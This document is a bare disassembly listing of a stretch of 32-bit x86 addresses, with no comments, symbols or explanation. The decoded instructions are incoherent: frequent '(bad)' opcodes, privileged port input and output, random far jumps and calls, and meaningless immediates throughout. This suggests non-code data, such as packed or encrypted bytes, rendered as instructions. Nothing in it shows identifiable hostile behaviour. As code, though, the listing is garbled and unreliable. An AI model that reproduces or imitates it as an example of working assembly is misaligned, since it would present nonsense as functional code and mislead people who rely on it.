  41aada:	cmp    ch,BYTE PTR [ecx+0x6a]
  41aadd:	add    DWORD PTR [esi-0x69],esi
  41aae0:	sti    
  41aae1:	xor    al,0x92
  41aae3:	pop    ds
  41aae4:	gs out 0x87,al
  41aae7:	pop    edx
  41aae8:	pop    ebp
  41aae9:	ret    
  41aaea:	pop    es
  41aaeb:	mov    al,ds:0x59664265
  41aaf0:	dec    ebx
  41aaf2:	adc    BYTE PTR [edi+0x1],ah
  41aaf5:	jmp    0xb71:0x963b52d5
  41aafc:	mov    ecx,0x19f4f38e
  41ab01:	ds pop ebp
  41ab03:	dec    edx
  41ab04:	mov    ecx,0xdb6eda1c
  41ab09:	or     cl,BYTE PTR [edx]
  41ab0b:	ret    
  41ab0c:	loop   0x41aad4
  41ab0e:	mov    eax,ds:0xaf5f7753
  41ab13:	mov    esi,0x836b2b03
  41ab18:	(bad)  
  41ab19:	fadd   DWORD PTR [edi-0x38101885]
  41ab1f:	ja     0x41ab2c
  41ab21:	or     eax,0xd3cdfc78
  41ab26:	xor    bl,bh
  41ab28:	out    0xa0,al
  41ab2a:	je     0x41aae9
  41ab2c:	in     eax,0x24
  41ab2e:	jbe    0x41ab1d
  41ab30:	mov    ah,BYTE PTR [ecx-0x6]
  41ab33:	outs   dx,BYTE PTR ds:[esi]
  41ab34:	mov    al,0xe0
  41ab36:	jnp    0x41ab6d
  41ab38:	jno    0x41ab2b
  41ab3a:	dec    edi
  41ab3b:	or     ah,BYTE PTR [edx]
  41ab3d:	mov    edx,0x5a40809b
  41ab42:	shr    DWORD PTR [ebx-0x3],cl
  41ab45:	cdq    
  41ab46:	jl     0x41ab6a
  41ab48:	and    BYTE PTR [esi],bl
  41ab4a:	out    dx,eax
  41ab4b:	and    eax,0x7a8facb1
  41ab50:	and    al,0x51
  41ab52:	adc    ch,dl
  41ab54:	lds    esp,FWORD PTR [esi+0x2d]
  41ab57:	inc    esp
  41ab58:	xlat   BYTE PTR ds:[ebx]
  41ab59:	adc    esp,ecx
  41ab5b:	or     edi,DWORD PTR [ebx+0x3]
  41ab5e:	cmp    eax,0xe7e9ccb1
  41ab63:	int    0x9
  41ab65:	test   cl,ah
  41ab67:	fsubr  QWORD PTR [ebp+0x73]
  41ab6a:	sub    DWORD PTR [edx-0x1a0148d6],ebp
  41ab70:	mov    eax,0xfd828dcb
  41ab75:	adc    ch,BYTE PTR [ebx+0x38bd18dd]
  41ab7b:	cmp    eax,DWORD PTR [edx-0x40]
  41ab7e:	cdq    
  41ab7f:	dec    eax
  41ab80:	fcmove st,st(7)
  41ab82:	add    DWORD PTR [edi-0x4b],esp
  41ab85:	into   
  41ab86:	(bad)  
  41ab87:	imul   esi
  41ab89:	retf   0x9cd0
  41ab8c:	or     al,0x7d
  41ab8e:	leave  
  41ab8f:	cmp    DWORD PTR [esi+0x34],ecx
  41ab92:	inc    edi
  41ab93:	xor    esi,eax
  41ab95:	or     eax,0x4ff65bb4
  41ab9a:	sub    DWORD PTR [eax+0x8932858],edi
  41aba0:	addr16 jnp 0x41ab52
  41aba3:	push   ss
  41aba4:	adc    eax,DWORD PTR [esi-0xb]
  41aba7:	mov    cl,BYTE PTR [ebx]
  41aba9:	fstp   QWORD PTR [edi-0x661f3363]
  41abaf:	sub    eax,0x775d76a
  41abb4:	jge    0x41ab37
  41abb6:	dec    ebp
  41abb7:	outs   dx,BYTE PTR ds:[esi]
  41abb8:	pop    edx
  41abb9:	(bad)  
  41abba:	fstp   TBYTE PTR [ecx-0x6]
  41abbd:	mov    fs,ebp
  41abbf:	fidivr WORD PTR [esi-0x16]
  41abc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc3:	in     al,dx
  41abc4:	outs   dx,DWORD PTR ds:[esi]
  41abc5:	mov    ebp,0xb59cc292
  41abca:	push   edx
  41abcb:	push   esi
  41abcc:	push   ss
  41abcd:	jge    0x41ac22
  41abcf:	data16 jo 0x41ab5e
  41abd2:	jo     0x41abbf
  41abd4:	popf   
  41abd5:	popa   
  41abd6:	repnz mov ecx,DWORD PTR [eax-0x7f]
  41abda:	cli    
  41abdb:	or     BYTE PTR [edx-0x21a83722],ch
  41abe1:	push   ss
  41abe2:	dec    edi
  41abe3:	sbb    DWORD PTR [ebx],eax
  41abe5:	mov    ch,0xf1
  41abe7:	mov    bl,0x1b
  41abe9:	and    DWORD PTR [eax-0x93c4069],edx
  41abef:	retf   
  41abf0:	(bad)  
  41abf1:	stc    
  41abf2:	dec    dh
  41abf4:	xchg   esi,eax
  41abf5:	or     eax,0x956c445b
  41abfa:	mov    cl,0xcf
  41abfc:	sbb    ecx,DWORD PTR [ebx-0x274e4e64]
  41ac02:	mov    al,ds:0x910bfdf7
  41ac07:	int    0xdb
  41ac09:	mov    ecx,0x8f2c0d9b
  41ac0e:	jmp    DWORD PTR [ebp+0x1d]
  41ac11:	adc    ecx,DWORD PTR [ebx]
  41ac13:	inc    ebx
  41ac14:	psrad  mm3,mm7
  41ac17:	ds into 
  41ac19:	sub    edx,DWORD PTR [ebp+0x44]
  41ac1c:	nop
  41ac1d:	scas   al,BYTE PTR es:[edi]
  41ac1e:	mov    DWORD PTR [esi+0x17],0x59fe688e
  41ac25:	jmp    0x483a:0xf98b815
  41ac2c:	test   BYTE PTR [eax+0x1d],al
  41ac2f:	add    ch,BYTE PTR [ecx]
  41ac31:	sbb    cl,BYTE PTR [ecx+0x65]
  41ac34:	adc    BYTE PTR [edi],bh
  41ac36:	xchg   esi,eax
  41ac37:	sub    ebp,edx
  41ac39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac3a:	out    dx,eax
  41ac3b:	and    esp,DWORD PTR [esi+ecx*4+0x4dc2cde3]
  41ac42:	inc    eax
  41ac43:	inc    eax
  41ac44:	mov    ch,0xf8
  41ac46:	dec    ecx
  41ac47:	jmp    0x81be:0xc0d5b3d9
  41ac4e:	mov    ds:0xa020ddd3,eax
  41ac53:	cld    
  41ac54:	fs es jb 0x41abeb
  41ac58:	stc    
  41ac59:	and    ebx,DWORD PTR cs:[edx+0x62]
  41ac5d:	jne    0x41acc2
  41ac5f:	stos   DWORD PTR es:[edi],eax
  41ac60:	xor    BYTE PTR [ecx+eiz*2-0x60],dh
  41ac64:	fsubr  DWORD PTR [eax+0x13394daa]
  41ac6a:	adc    BYTE PTR [edi-0x2f],bl
  41ac6d:	fbld   TBYTE PTR [edi-0x40]
  41ac70:	or     al,0x72
  41ac72:	adc    DWORD PTR [edx],esi
  41ac74:	dec    esi
  41ac75:	sbb    ebx,DWORD PTR [ebp+edx*2-0x77]
  41ac79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac7a:	retf   0x58bb
  41ac7d:	sbb    eax,0x4849971d
  41ac82:	or     DWORD PTR [ebx+0x416399a],eax
  41ac88:	push   ecx
  41ac89:	push   es
  41ac8a:	sbb    al,0x56
  41ac8c:	push   eax
  41ac8d:	add    ecx,ebx
  41ac8f:	nop
  41ac90:	sub    ah,ch
  41ac92:	add    DWORD PTR [eax-0x4d213989],0xa6286c3c
  41ac9c:	int    0xc3
  41ac9e:	frstor [edi-0x16]
  41aca1:	shl    dl,cl
  41aca3:	or     BYTE PTR [eax],0x52
  41aca6:	shl    edi,1
  41aca8:	rol    ah,0xc5
  41acab:	push   ebx
  41acac:	mov    al,ds:0xb5bd3b89
  41acb1:	pop    ss
  41acb2:	(bad)  
  41acb3:	fwait
  41acb4:	jo     0x41ac81
  41acb6:	and    ah,BYTE PTR [edx]
  41acb8:	inc    esp
  41acb9:	dec    edi
  41acba:	or     DWORD PTR [ebp+0x537fc561],ebx
  41acc0:	inc    ebp
  41acc1:	cmp    DWORD PTR [ebx],edx
  41acc3:	out    dx,al
  41acc4:	mov    DWORD PTR [edx-0x11ff800a],ebp
  41acca:	pop    eax
  41accb:	jae    0x41ad29
  41accd:	out    0x7b,al
  41accf:	pop    ds
  41acd0:	test   DWORD PTR [ebp-0xfa29582],edx
  41acd6:	and    edi,DWORD PTR [eax]
  41acd8:	dec    esi
  41acd9:	xchg   DWORD PTR [edx+edx*1+0x48],ebp
  41acdd:	dec    ebp
  41acde:	or     BYTE PTR [eax],dl
  41ace0:	aas    
  41ace1:	add    cl,cl
  41ace3:	sbb    DWORD PTR [ebp+0x69],ecx
  41ace6:	jl     0x41acd8
  41ace8:	cld    
  41ace9:	dec    ebx
  41acea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aceb:	adc    DWORD PTR [eax],0xfffffff7
  41acee:	fwait
  41acef:	adc    al,BYTE PTR [edi*4+0x1d382980]
  41acf6:	lds    esi,FWORD PTR [ebx+0x6e6e08dc]
  41acfc:	scas   eax,DWORD PTR es:[edi]
  41acfd:	sbb    ebx,DWORD PTR [ebp-0x20]
  41ad00:	inc    edi
  41ad01:	loopne 0x41ad4e
  41ad03:	out    0x78,eax
  41ad05:	or     eax,0x52b93055
  41ad0a:	(bad)  
  41ad0c:	add    BYTE PTR [esi+ebp*2-0x413c2534],bl
  41ad13:	push   ss
  41ad14:	scas   al,BYTE PTR es:[edi]
  41ad15:	daa    
  41ad16:	mov    ah,0x6b
  41ad18:	into   
  41ad19:	gs jne 0x41aca4
  41ad1c:	inc    ebx
  41ad1d:	les    edx,FWORD PTR [ebp-0x35318dda]
  41ad23:	fwait
  41ad24:	or     eax,0x6cb70415
  41ad29:	mov    ds:0xd2554877,eax
  41ad2e:	mov    ecx,0xe5e9ad33
  41ad33:	lock outs dx,DWORD PTR ds:[esi]
  41ad35:	mov    dl,0xad
  41ad37:	rcl    DWORD PTR [ecx+ebp*8+0x626d70ad],1
  41ad3e:	mov    WORD PTR [ecx-0x74ebdf77],gs
  41ad44:	sahf   
  41ad45:	sbb    BYTE PTR [edx+ebx*2+0x170ce7d1],0x74
  41ad4d:	adc    edx,edi
  41ad4f:	adc    edx,esi
  41ad51:	stos   DWORD PTR es:[edi],eax
  41ad52:	loope  0x41ad57
  41ad54:	test   al,0x23
  41ad56:	cs addr16 pop eax
  41ad59:	je     0x41ad30
  41ad5b:	(bad)  
  41ad5c:	mov    cl,0xaf
  41ad5e:	pushf  
  41ad5f:	mov    cl,0xb5
  41ad61:	rcr    ebp,cl
  41ad63:	pop    edx
  41ad64:	mov    gs,WORD PTR [edi+esi*2+0x3e]
  41ad68:	cmp    DWORD PTR [ecx-0xa],esp
  41ad6b:	mov    dh,0x75
  41ad6d:	xchg   DWORD PTR [edi+0x527f22e6],esi
  41ad73:	lock je 0x41ad44
  41ad76:	or     eax,ecx
  41ad78:	ror    BYTE PTR [ecx+0x3a],1
  41ad7b:	sbb    eax,0x112ea3e8
  41ad80:	and    ebx,DWORD PTR [ebx+0x2afeb049]
  41ad86:	mov    esi,0xb3c3626d
  41ad8b:	mov    bl,BYTE PTR [ebp-0x61aca17d]
  41ad91:	inc    eax
  41ad92:	ja     0x41adb9
  41ad94:	nop
  41ad95:	pop    ds
  41ad96:	pop    esp
  41ad97:	pusha  
  41ad98:	aad    0xeb
  41ad9a:	enter  0x22aa,0x59
  41ad9e:	xchg   ebp,eax
  41ad9f:	aam    0x67
  41ada1:	adc    eax,0xcfa7ff2c
  41ada6:	mov    al,ds:0x5645fbe7
  41adab:	xor    esp,DWORD PTR [ebp+0xcbf4898]
  41adb1:	call   0xefe4:0x5f2edfdb
  41adb8:	push   0x856a0217
  41adbd:	mov    BYTE PTR ds:0x8cf849a0,dh
  41adc3:	sbb    DWORD PTR [edi-0x21a84667],esp
  41adc9:	jne    0x41addb
  41adcb:	sbb    edi,DWORD PTR [ebp-0x6f]
  41adce:	shl    DWORD PTR [ebx+0x6ed14aa8],cl
  41add4:	mov    edi,0xa1eb1139
  41add9:	push   ebx
  41adda:	ins    DWORD PTR es:[edi],dx
  41addb:	cli    
  41addc:	in     eax,dx
  41addd:	jl     0x41ae4c
  41addf:	fld    QWORD PTR [esi]
  41ade1:	scas   al,BYTE PTR es:[edi]
  41ade2:	sbb    BYTE PTR [edi+0x5b],0x24
  41ade6:	ja     0x41ae09
  41ade8:	addr16 jle 0x41aded
  41adeb:	pushf  
  41adec:	shl    DWORD PTR [ebx],0x97
  41adef:	cli    
  41adf0:	shr    DWORD PTR [ebx],0x68
  41adf3:	inc    esi
  41adf4:	stos   DWORD PTR es:[edi],eax
  41adf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adf6:	mov    eax,esi
  41adf8:	add    BYTE PTR [esp+esi*2],bh
  41adfb:	imul   edi,ebp,0xffffffc5
  41adfe:	fsubr  QWORD PTR [esi+0x32a554c5]
  41ae04:	mov    edi,0xd63d24a9
  41ae09:	xor    DWORD PTR [edx-0x1962cb2a],ecx
  41ae0f:	and    eax,0x6122ce1b
  41ae14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae15:	cmp    cl,BYTE PTR [esi]
  41ae17:	push   eax
  41ae18:	mov    eax,0xe806b724
  41ae1d:	or     cl,0xa4
  41ae20:	pop    ebp
  41ae21:	pusha  
  41ae22:	cmp    esp,DWORD PTR [esi-0x69]
  41ae25:	cmc    
  41ae26:	mov    ebp,0x2d6a23a4
  41ae2b:	jno    0x41ae1e
  41ae2d:	ffreep st(7)
  41ae2f:	push   0x9afef017
  41ae34:	jecxz  0x41add7
  41ae36:	loope  0x41adc4
  41ae38:	mov    edx,0xfd8f3d8f
  41ae3d:	ins    DWORD PTR es:[edi],dx
  41ae3e:	mov    ds:0x68dd2aea,al
  41ae43:	push   edi
  41ae44:	in     al,dx
  41ae45:	mov    ds:0x9a900d81,al
  41ae4a:	mov    dh,0x8b
  41ae4c:	imul   DWORD PTR [edx]
  41ae4e:	popa   
  41ae4f:	(bad)  [edx-0x33e55d9c]
  41ae55:	int3   
  41ae56:	cs push edi
  41ae58:	repz in eax,0xf0
  41ae5b:	push   ebp
  41ae5c:	xor    eax,0xc59d54e5
  41ae61:	outs   dx,BYTE PTR ds:[esi]
  41ae62:	and    cl,BYTE PTR [edi-0x56]
  41ae65:	sbb    DWORD PTR [eax+eax*8],edx
  41ae68:	popf   
  41ae69:	push   0x78
  41ae6b:	outs   dx,DWORD PTR ds:[esi]
  41ae6c:	push   edi
  41ae6d:	stc    
  41ae6e:	ins    BYTE PTR es:[edi],dx
  41ae6f:	(bad)  
  41ae70:	sti    
  41ae71:	scas   al,BYTE PTR es:[edi]
  41ae72:	aam    0xba
  41ae74:	sbb    al,bh
  41ae76:	adc    eax,ebx
  41ae78:	enter  0xf44c,0xf8
  41ae7c:	call   0x4aca:0x8a0258a
  41ae83:	mov    eax,ds:0xeccb53c6
  41ae88:	jle    0x41ae6b
  41ae8a:	dec    ecx
  41ae8b:	jl     0x41ae21
  41ae8d:	fst    st(4)
  41ae8f:	iret   
  41ae90:	and    BYTE PTR [esi-0x4a],ah
  41ae93:	cwde   
  41ae94:	out    dx,eax
  41ae95:	bound  esp,QWORD PTR [edx+0x25]
  41ae98:	jmp    0x3f7f82f9
  41ae9d:	jecxz  0x41aefe
  41ae9f:	adc    ah,BYTE PTR [ebp-0x18]
  41aea2:	sub    esi,esp
  41aea4:	daa    
  41aea5:	dec    ax
  41aea7:	push   esp
  41aea8:	pop    edi
  41aea9:	ss mov ah,0xb1
  41aeac:	or     al,0x97
  41aeae:	adc    DWORD PTR [edi+ebx*1-0x738d6f9f],0xacdc4613
  41aeb9:	dec    edx
  41aeba:	xor    al,BYTE PTR [ebx]
  41aebc:	int3   
  41aebd:	xchg   ebx,eax
  41aebe:	mov    ch,0xea
  41aec0:	sbb    al,0xd6
  41aec2:	sti    
  41aec3:	jne    0x41aee8
  41aec5:	mov    WORD PTR [bp+di],es
  41aec8:	loopne 0x41aebc
  41aeca:	xor    edx,DWORD PTR [edx+0x28]
  41aecd:	aad    0x86
  41aecf:	scas   al,BYTE PTR es:[edi]
  41aed0:	pusha  
  41aed1:	lea    ecx,[edi+0x26]
  41aed4:	mov    ebp,0x2e9f7e1
  41aed9:	inc    esp
  41aeda:	(bad)  
  41aedb:	cwde   
  41aedc:	sub    DWORD PTR gs:0x859c156f,esi
  41aee3:	add    cl,BYTE PTR [ebx]
  41aee5:	mov    WORD PTR [esi],es
  41aee7:	cmp    al,0xbf
  41aee9:	mov    ecx,0xbd70a00b
  41aeee:	jae    0x41af34
  41aef0:	add    al,0xbd
  41aef2:	sar    BYTE PTR [ecx+0x6a],cl
  41aef5:	fdivp  st(7),st
  41aef7:	adc    al,0x4a
  41aef9:	jl     0x41af47
  41aefb:	mov    ds:0xf9554152,eax
  41af00:	and    eax,0xf4679028
  41af05:	inc    ecx
  41af06:	push   ecx
  41af07:	and    eax,esp
  41af09:	pop    edi
  41af0a:	push   ss
  41af0b:	les    ebp,FWORD PTR [eax]
  41af0d:	loope  0x41ae9a
  41af0f:	adc    al,0x4
  41af11:	out    dx,eax
  41af12:	mov    ebp,0xd133ca14
  41af17:	lahf   
  41af18:	les    ebx,FWORD PTR [esi+0x5f]
  41af1b:	push   ds
  41af1c:	dec    ebx
  41af1d:	sub    DWORD PTR ds:0x1f17c9df,ebp
  41af23:	xor    al,0x2d
  41af25:	mov    al,ds:0xcb3d5a9f
  41af2a:	fadd   st(0),st
  41af2c:	jl     0x41af80
  41af2e:	sti    
  41af2f:	mov    esp,0x262af92b
  41af34:	fcmovnbe st,st(4)
  41af36:	xorps  xmm2,XMMWORD PTR [ebx]
  41af39:	pop    eax
  41af3a:	test   eax,0xc52a3015
  41af3f:	(bad)  
  41af41:	ret    
  41af42:	and    edi,DWORD PTR [esi+eiz*2]
  41af45:	inc    BYTE PTR [edi]
  41af47:	ss mov ebx,0xea9753b5
  41af4d:	and    BYTE PTR [eax+edx*2],dh
  41af50:	mov    edi,0xbbb57500
  41af55:	push   ss
  41af56:	mov    esp,0x1e61aed6
  41af5b:	push   eax
  41af5c:	mov    dl,0x3f
  41af5e:	adc    ebp,edx
  41af60:	and    al,0xc7
  41af62:	mov    dh,0x70
  41af64:	stc    
  41af65:	aam    0xd5
  41af67:	movaps xmm1,xmm4
  41af6a:	push   edx
  41af6b:	inc    DWORD PTR [esi-0x39]
  41af6e:	sub    BYTE PTR [esi-0x4f],0x21
  41af72:	lea    ebp,[ecx+0x20]
  41af75:	(bad)  
  41af76:	into   
  41af77:	xor    al,0x7d
  41af79:	retf   
  41af7a:	sbb    ah,BYTE PTR [ebx+0x3a]
  41af7d:	xor    esp,DWORD PTR [ecx+ecx*1-0x6e]
  41af81:	sbb    DWORD PTR [edi-0x76a0d23e],ecx
  41af87:	nop
  41af88:	stos   DWORD PTR es:[edi],eax
  41af89:	push   edx
  41af8a:	pushf  
  41af8b:	cmp    eax,0xa9295cd1
  41af90:	outs   dx,BYTE PTR ds:[esi]
  41af91:	pop    ebp
  41af92:	retf   
  41af93:	outs   dx,BYTE PTR ds:[esi]
  41af94:	cli    
  41af95:	push   esi
  41af96:	inc    eax
  41af97:	ins    DWORD PTR es:[edi],dx
  41af98:	mov    ecx,0x6ac41d30
  41af9d:	dec    ecx
  41af9e:	fisttp DWORD PTR [ebp+0x43678d65]
  41afa4:	es sub ebx,edx
  41afa7:	cmp    DWORD PTR ds:0x3e5a107e,ebp
  41afad:	lea    eax,[esi+0xc]
  41afb0:	mov    ch,0x52
  41afb2:	in     eax,0xd8
  41afb4:	mov    edi,0x75123d13
  41afb9:	add    DWORD PTR [ecx+0x41a18bfb],esp
  41afbf:	jmp    0x41b000
  41afc1:	aaa    
  41afc2:	mov    dl,0xf7
  41afc4:	and    ah,dl
  41afc6:	(bad)  
  41afc7:	ficomp DWORD PTR [eax]
  41afc9:	sub    eax,0xe913beae
  41afce:	xlat   BYTE PTR ds:[ebx]
  41afcf:	xchg   ebx,ebx
  41afd1:	sub    eax,DWORD PTR [ebp-0x16]
  41afd4:	enter  0x3710,0x6c
  41afd8:	pop    ds
  41afd9:	or     BYTE PTR [ebp+0x75],0x94
  41afdd:	mov    ds:0x561f605f,eax
  41afe2:	add    DWORD PTR [edi-0x80],ebx
  41afe5:	sbb    cl,ah
  41afe7:	lods   al,BYTE PTR ds:[esi]
  41afe8:	and    al,0x87
  41afea:	and    eax,0x5b7cb0ea
  41afef:	dec    edi
  41aff0:	pop    eax
  41aff1:	(bad)  
  41aff2:	bound  ebp,QWORD PTR [ecx]
  41aff4:	neg    edx
  41aff6:	clc    
  41aff7:	mov    esi,0x4857b1d6
  41affc:	js     0x41b01a
  41affe:	inc    ebp
  41afff:	cs jl  0x41af92
  41b002:	jle    0x41b042
  41b004:	dec    eax
  41b005:	mov    ch,BYTE PTR [ebx+0x52549679]
  41b00b:	sub    bh,0xe0
  41b00e:	inc    ebp
  41b00f:	pop    ecx
  41b010:	xchg   ebp,eax
  41b011:	hlt    
  41b012:	aam    0x63
  41b014:	bound  eax,QWORD PTR [ebx]
  41b016:	jle    0x41b082
  41b018:	ficomp WORD PTR [edx]
  41b01a:	jo     0x41afef
  41b01c:	out    0x63,al
  41b01e:	das    
  41b01f:	in     eax,0xfb
  41b021:	ins    BYTE PTR es:[edi],dx
  41b022:	add    BYTE PTR [edi],dl
  41b024:	lock mov ah,0x34
  41b027:	and    eax,ecx
  41b029:	cmc    
  41b02a:	sbb    edi,edx
  41b02c:	(bad)  
  41b02d:	pop    edx
  41b02e:	sub    al,BYTE PTR [eax]
  41b030:	pusha  
  41b031:	fs js  0x41b0a9
  41b034:	mov    BYTE PTR [edi],0xa4
  41b037:	ret    0xcf10
  41b03a:	and    al,0x61
  41b03c:	fld    TBYTE PTR [ecx+0x6eb354e1]
  41b042:	mov    ebx,0x8fd350f2
  41b047:	mov    ebp,DWORD PTR [ebp+0x20]
  41b04a:	aas    
  41b04b:	scas   eax,DWORD PTR es:[edi]
  41b04c:	or     ebp,DWORD PTR [edx+0x35e04c9a]
  41b052:	ins    BYTE PTR es:[edi],dx
  41b053:	retf   
  41b054:	cwde   
  41b055:	adc    bh,bh
  41b057:	push   ds
  41b058:	aam    0xe1
  41b05a:	sub    al,0x67
  41b05c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b05d:	or     esp,DWORD PTR [edx-0x61]
  41b060:	aas    
  41b061:	pop    edx
  41b062:	lods   al,BYTE PTR ds:[esi]
  41b063:	pushf  
  41b064:	mov    dh,0x3f
  41b066:	adc    al,0x4f
  41b068:	adc    esi,edi
  41b06a:	in     eax,dx
  41b06b:	add    al,0x6b
  41b06d:	cs push ss
  41b06f:	popf   
  41b070:	add    DWORD PTR [eax-0x14717416],ebx
  41b076:	inc    ebx
  41b077:	jmp    0x1ecf9df1
  41b07c:	xchg   DWORD PTR [edi-0x6c45b42f],ebp
  41b082:	ins    BYTE PTR es:[edi],dx
  41b083:	sahf   
  41b084:	dec    eax
  41b085:	addr16 fcmovb st,st(5)
  41b088:	ins    BYTE PTR es:[edi],dx
  41b089:	loopne 0x41b0de
  41b08b:	call   0x32e238c1
  41b090:	cmp    DWORD PTR [edi-0x51],ecx
  41b093:	rcl    BYTE PTR [esi+0x7d],1
  41b096:	(bad)  
  41b097:	dec    ecx
  41b098:	clc    
  41b099:	mov    al,ds:0xad4155f7
  41b09e:	popa   
  41b09f:	push   ebp
  41b0a0:	xchg   ecx,eax
  41b0a1:	pop    ss
  41b0a2:	leave  
  41b0a3:	bound  esi,QWORD PTR [eax+esi*4]
  41b0a6:	daa    
  41b0a7:	mov    ah,0xe5
  41b0a9:	iret   
  41b0aa:	mov    edi,0x96d9c524
  41b0af:	fsubr  DWORD PTR ds:0xa5e42ac7
  41b0b5:	jae    0x41b10c
  41b0b7:	enter  0xb880,0x70
  41b0bb:	xor    DWORD PTR [ebx-0x6cdc6e20],0xfffffff4
  41b0c2:	inc    esp
  41b0c3:	sar    BYTE PTR [ebx],0xbe
  41b0c6:	repz dec ebp
  41b0c8:	mov    cl,0xd3
  41b0ca:	sbb    eax,0xc19372ee
  41b0cf:	movd   mm5,DWORD PTR [ecx-0x1cdbc369]
  41b0d6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41b0d8:	test   BYTE PTR [edi-0xf79a270],ah
  41b0de:	sub    al,0xaa
  41b0e0:	xor    dh,bh
  41b0e2:	aad    0xff
  41b0e4:	arpl   di,si
  41b0e6:	into   
  41b0e7:	sbb    edx,DWORD PTR [ebx+0x5e50ccc9]
  41b0ed:	add    al,0x84
  41b0ef:	push   ebp
  41b0f0:	jl     0x41b091
  41b0f2:	mov    esp,0x48a6310c
  41b0f7:	add    eax,DWORD PTR [edx-0x44b11377]
  41b0fd:	aam    0xd0
  41b0ff:	retf   0x8781
  41b102:	icebp  
  41b103:	in     al,0xe4
  41b105:	cmp    dl,cl
  41b107:	or     esp,DWORD PTR [ecx-0xcb04d2c]
  41b10d:	retf   0x8126
  41b110:	sbb    BYTE PTR [esi-0x303f64dd],dh
  41b116:	jae    0x41b0ad
  41b118:	icebp  
  41b119:	test   dl,dh
  41b11b:	in     al,0x10
  41b11d:	mov    bl,0xdc
  41b11f:	inc    ebp
  41b120:	pop    edx
  41b121:	jmp    0xbfef:0xf51836e3
  41b128:	jmp    0x63eb:0x63fc253d
  41b12f:	push   es
  41b130:	mov    bl,0x8a
  41b132:	mov    dh,0x79
  41b134:	std    
  41b135:	adc    eax,0x57c37491
  41b13a:	mov    ds:0x11b79bf0,eax
  41b13f:	data16 fisttp DWORD PTR [ebx-0x1738bb09]
  41b146:	in     eax,0x4d
  41b148:	shl    BYTE PTR [ebp+0x59],1
  41b14b:	in     al,dx
  41b14c:	inc    esp
  41b14d:	mov    cl,0x9f
  41b14f:	(bad)  [esi]
  41b151:	and    bl,dh
  41b153:	cmc    
  41b154:	pop    esi
  41b155:	xchg   esi,eax
  41b156:	nop
  41b157:	inc    esi
  41b158:	jo     0x41b190
  41b15a:	mov    esp,0x74de677b
  41b15f:	mul    BYTE PTR [edx-0x29]
  41b162:	cmp    al,0xa
  41b164:	pop    ebx
  41b165:	popf   
  41b166:	or     BYTE PTR [esi+0x2a],ah
  41b169:	pop    es
  41b16a:	int    0x4
  41b16c:	(bad)  
  41b16d:	stc    
  41b16e:	jae    0x41b0f6
  41b170:	mov    dl,0xbb
  41b172:	xchg   BYTE PTR [eax+ecx*8-0x658c0e87],cl
  41b179:	jp     0x41b153
  41b17b:	cmp    al,0xf9
  41b17d:	(bad)
  41b180:	into   
  41b181:	mov    bh,dh
  41b183:	scas   al,BYTE PTR es:[edi]
  41b184:	xchg   ebx,eax
  41b185:	icebp  
  41b186:	stos   DWORD PTR es:[edi],eax
  41b187:	paddb  mm7,QWORD PTR [ebp-0x37]
  41b18b:	jbe    0x41b1f3
  41b18d:	xchg   ebp,eax
  41b18e:	push   esp
  41b18f:	mov    dl,0xf6
  41b191:	fcomip st,st(1)
  41b193:	sti    
  41b194:	imul   esi,DWORD PTR [eax],0xffffff88
  41b197:	inc    eax
  41b198:	jle    0x41b1d0
  41b19a:	shl    BYTE PTR [ebx+0x54],1
  41b19d:	mov    esi,0x1f9890af
  41b1a2:	xor    DWORD PTR [eax-0x18],ecx
  41b1a5:	daa    
  41b1a6:	mov    ds:0xab6067b,eax
  41b1ab:	call   0x8cbf9f18
  41b1b0:	clc    
  41b1b1:	push   ss
  41b1b2:	lods   eax,DWORD PTR ds:[esi]
  41b1b3:	adc    eax,0x9a7ed75d
  41b1b8:	mov    al,BYTE PTR [ecx]
  41b1ba:	push   ecx
  41b1bb:	adc    al,0x4c
  41b1bd:	sbb    al,0x6e
  41b1bf:	sbb    dh,al
  41b1c1:	es dec eax
  41b1c3:	mov    dl,0xaf
  41b1c5:	lods   eax,DWORD PTR ds:[esi]
  41b1c6:	xor    DWORD PTR [esi+esi*8+0x8],edi
  41b1ca:	sub    DWORD PTR ds:0x1a682413,edx
  41b1d0:	stos   DWORD PTR es:[edi],eax
  41b1d1:	or     al,0x2b
  41b1d3:	test   al,0xcc
  41b1d5:	dec    esi
  41b1d6:	mov    ds:0x5b2d1678,al
  41b1db:	jno    0x41b227
  41b1dd:	add    dh,BYTE PTR [edx+0x5b90bcf4]
  41b1e3:	mov    edx,0x43eddc69
  41b1e8:	or     edi,0x1ef527d3
  41b1ee:	arpl   WORD PTR [edx],cx
  41b1f0:	fisubr WORD PTR [edi]
  41b1f2:	imul   esp,DWORD PTR cs:[edx],0x968cfaf9
  41b1f9:	push   esp
  41b1fa:	jecxz  0x41b273
  41b1fc:	mov    ds:0x60885222,eax
  41b201:	dec    ecx
  41b202:	dec    ebx
  41b203:	das    
  41b204:	cmp    DWORD PTR [eax],ecx
  41b206:	bound  ecx,QWORD PTR [eax+0x21]
  41b209:	xchg   esp,eax
  41b20a:	shr    BYTE PTR ss:[edi-0x50727afe],0x49
  41b212:	push   esp
  41b213:	xchg   ebx,eax
  41b214:	pop    esp
  41b215:	loop   0x41b252
  41b217:	push   ds
  41b218:	cmc    
  41b219:	dec    edi
  41b21a:	jmp    0x41b28e
  41b21c:	xchg   edi,eax
  41b21d:	and    eax,DWORD PTR ds:0xd6b477fd
  41b223:	inc    ebp
  41b224:	xlat   BYTE PTR ds:[ebx]
  41b225:	and    bh,BYTE PTR ss:[ebx-0x477b51d9]
  41b22c:	ret    0x4e04
  41b22f:	gs push cs
  41b231:	sub    DWORD PTR [ecx-0x61d5b467],eax
  41b237:	lods   al,BYTE PTR ds:[esi]
  41b238:	pop    esp
  41b239:	mov    edi,0xc634c663
  41b23e:	es mov eax,esp
  41b241:	test   al,0x7d
  41b243:	jnp    0x41b217
  41b245:	sbb    DWORD PTR [eax-0x2e],0xffffff9b
  41b249:	pop    ebp
  41b24a:	mov    dl,0x5c
  41b24c:	icebp  
  41b24d:	cld    
  41b24e:	push   esp
  41b24f:	dec    edi
  41b250:	jmp    0xedab:0x5b4f55b3
  41b257:	jmp    0xb85e149a
